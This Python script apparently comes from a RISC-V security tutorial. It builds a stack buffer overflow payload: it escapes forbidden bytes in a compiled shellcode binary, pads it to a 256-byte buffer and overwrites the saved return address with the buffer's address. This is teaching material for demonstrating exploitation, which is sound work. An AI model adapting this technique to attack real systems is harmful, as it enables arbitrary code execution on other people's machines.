#!/usr/bin/python
# -*- coding: utf-8 -*-
# ************************************************************************
#
# (C) COPYRIGHT 2016 TECHNOLUTION BV, GOUDA NL
# | =======          I                   ==          I    =
# |    I             I                    I          I
# |    I   ===   === I ===  I ===   ===   I  I    I ====  I   ===  I ===
# |    I  /   \ I    I/   I I/   I I   I  I  I    I  I    I  I   I I/   I
# |    I  ===== I    I    I I    I I   I  I  I    I  I    I  I   I I    I
# |    I  \     I    I    I I    I I   I  I  I   /I  \    I  I   I I    I
# |    I   ===   === I    I I    I  ===  ===  === I   ==  I   ===  I    I
# |                 +---------------------------------------------------+
# +----+            |  +++++++++++++++++++++++++++++++++++++++++++++++++|
#      |            |             ++++++++++++++++++++++++++++++++++++++|
#      +------------+                          +++++++++++++++++++++++++|
#                                                         ++++++++++++++|
#                                                                  +++++|
#
# ************************************************************************
""" tool to build exploit for RISC-V tutorial demo
    
    author: Jonathan Hofman (jonathan.hofman@technolution.eu)
"""

import logging
import argparse
import struct

escape_char = '\x04'
escaped_characters = (escape_char, '\n', '\r', '\b', ' ')
buffer_size = 256
ra_offset = buffer_size + 12


#################################################################################
## obtainOptions
#################################################################################
def obtainOptions():
    """ Obtain the application options. Currently the application is only 
        configured using command line arguments.
    """
    parser = argparse.ArgumentParser(description="usage: %prog [options]")
    parser.add_argument("-b", "--bin_file", dest = "bin_path", 
                      help = "bin file with application code", default='exploit.bin')
    parser.add_argument("-n", "--nm_file", dest = "nm_path", 
                      help = "nm file with symbol info", default='exploit.nm')
    parser.add_argument("-o", "--output_file", dest = "output_path", 
                      help = "output filename", default='exploit.raw')

    args = parser.parse_args()

    if args.bin_path is None:
        print "Error: bin file not set"
        exit(-1)

    if args.nm_path is None:
        print "Error: nm file not set"
        exit(-1)

    if args.output_path is None:
        print "Error: output file not set"
        exit(-1)
    
    return args 

#################################################################################
## nm file parser
#################################################################################
class NmFile(object):
    def __init__(self, path):
        self.symbols = {}
        self.address = {}
        for line in open(path, 'r').readlines():
            line = line.strip('\n').split(' ')
            #print line
            self.symbols[line[2]] = int(line[0], 16)
            self.address[int(line[0], 16)] = line[2] 
        
    def get_address(self, symbol):
        return self.symbols[symbol]
            
        
#################################################################################
## main
#################################################################################

if __name__ == "__main__":
    logging.basicConfig(level   = logging.DEBUG,
                        format  = '%(asctime)s [%(levelname)-8s] %(message)s',
                        datefmt = '%H:%M:%S')   
    options = obtainOptions()

    nm_file = NmFile(options.nm_path)

    sp_address = nm_file.get_address('__exploit_start')
    buffer_address = sp_address
    sp_ra_address = sp_address + ra_offset
    prev_sp_address = sp_address + ra_offset + 4 # 1 alignment word and one ra work

    logging.info("{:<26} : 0x{:08x}".format('stack address', sp_address))
    logging.info("{:<26} : 0x{:08x}".format('previous stack address', prev_sp_address))
    logging.info("{:<26} : 0x{:08x}".format('ra address', sp_ra_address))
    logging.info("{:<26} : 0x{:08x}".format('buffer address', buffer_address))
    
    ra_stack_value = struct.pack('<L', buffer_address)
    bin = open(options.bin_path, 'rb').read()
    
    # expand the output
    if len(bin) > 256:
        logging.error("The program is larger than the buffer space that is available in the exploit. Most likely the"
                      "exploit will fail.")
        exit(1)
        
    logging.info("{:<26} : {:d} bytes, {:d} words".format('bin size', len(bin), len(bin) / 4))

    output = bin

    # check if we don't have 'forbidden' characters in our startup code
    su_size = nm_file.get_address('fe_end') - nm_file.get_address('__exploit_start') 
    logging.info("{:<26} : {:d} bytes, {:d} words".format('start up code size', su_size, su_size / 4))

    startup_code = output[0:su_size]
    
    for esc in escaped_characters:
        if startup_code.find(esc) > 0:
            raise Exception("Escaped character found in startup code '{0}'".format(esc))
        
    # excape all caracters that are handled specially in the main program
    # we use 0x04 as it does not trigger the 'decode code' to contain excape 
    # caracters the value 32 that is added to the escape is a little random, but 
    # was chosen as it is a normal character.
    for esc in escaped_characters:
        output = output.replace(esc, escape_char + chr(ord(esc) + 32)) # replace esc with esc + 32
    
    # check if escaping didn't make the file to big
    if len(output) > buffer_size:
        logging.error("Escaping made the binary to big for the buffer (actual {0}, buffer {1})".format(len(output), buffer_size))
        exit(1)
 
    logging.info("{:<26} : {:d} bytes, {:d} words".format('escaped size', len(output), (len(output) + 3) / 4))
   
    # pad the buffer until the ra positon on the stack
    output = output + ('\x00' * (buffer_size - len(output)))

    # append the value for the return adress on the stack
    output = output + (4 * ra_stack_value)
    
    open(options.output_path, 'wb').write(output)    
